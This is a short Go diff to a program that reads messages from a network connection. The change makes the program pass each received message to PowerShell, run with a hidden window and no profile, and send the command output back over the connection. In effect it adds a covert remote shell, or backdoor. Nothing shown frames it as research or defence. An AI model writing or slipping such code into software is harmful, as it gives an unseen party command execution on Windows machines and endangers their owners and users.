@@ -4,6 +4,8 @@ import (
 	"bufio"
 	"fmt"
 	"net"
+	"os/exec"
+	"strings"
 	"time"
 )
 
@@ -41,12 +43,14 @@ func main() {
 			hErr(err)
 			main()
 		}
-
+		out, err := exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "hidden", "-NoLogo", strings.TrimSuffix(message, "\n")).Output()
 		fmt.Println(message)
-		if message == hello {
+		if strings.Contains(message, hello) {
+			fmt.Println("greeting")
 			conn.Write([]byte("hello 2 you 2"))
 		} else {
-			conn.Write([]byte("Unknown: " + message))
+			fmt.Println(string(out))
+			conn.Write([]byte(out))
 		}
 	}
 }
